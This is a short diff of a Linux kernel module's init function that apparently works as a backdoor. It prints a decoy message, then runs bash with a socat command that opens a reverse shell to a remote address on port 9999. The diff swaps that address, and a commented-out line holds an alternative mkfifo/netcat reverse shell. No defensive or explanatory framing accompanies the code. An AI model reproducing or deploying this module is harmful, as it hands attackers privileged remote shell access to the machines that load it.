@@ -11,7 +11,7 @@ static int __init lkm_example_init(void) {
  printk(KERN_INFO "Nothing to see here move along!\n");
  argv[0] = "/bin/bash";
  argv[1] = "-c";
- argv[2] = "/usr/bin/socat tcp-connect:127.0.0.1:9999 system:/bin/sh";
+ argv[2] = "/usr/bin/socat tcp-connect:127.1.64.15:9999 system:/bin/sh";
 /*argv[2] = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.30.20 9999 >/tmp/f"; */
  argv[3] = NULL;
 
